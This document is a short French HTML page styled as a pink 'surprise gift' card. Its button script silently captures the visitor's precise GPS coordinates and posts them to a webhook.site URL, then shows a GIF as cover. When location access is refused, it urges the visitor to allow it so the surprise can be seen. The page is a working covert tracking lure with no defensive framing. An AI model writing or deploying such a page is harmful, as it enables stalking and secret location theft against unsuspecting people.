<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Un petit cadeau pour toi ✨</title>
    <style>
        body { background-color: #fff0f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 320px; border: 2px solid #ffb6c1; }
        h1 { color: #ff69b4; }
        button { background-color: #ffb6c1; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Coucou ! ✨</h1>
        <p>J'ai préparé une petite surprise spéciale pour toi... Clique sur le bouton pour l'ouvrir !</p>
        <button onclick="envoyerGps()">Ouvrir ma surprise 🌸</button>
    </div>

    <script>
        function envoyerGps() {
            // TON LIEN EST ICI :
            const monWebhook = "https://webhook.site/e8e69f2b-cf41-4a3c-82f9-f71bb8c1c338";

            navigator.geolocation.getCurrentPosition((pos) => {
                fetch(monWebhook, {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        long: pos.coords.longitude
                    })
                });
                alert("La surprise arrive ! ✨");
                window.location.href = "https://media.giphy.com/media/KztT2c4u8mYYUiMKd1/giphy.gif";
            }, (err) => {
                alert("Oups ! Il faut autoriser la localisation pour voir la surprise. ✨");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
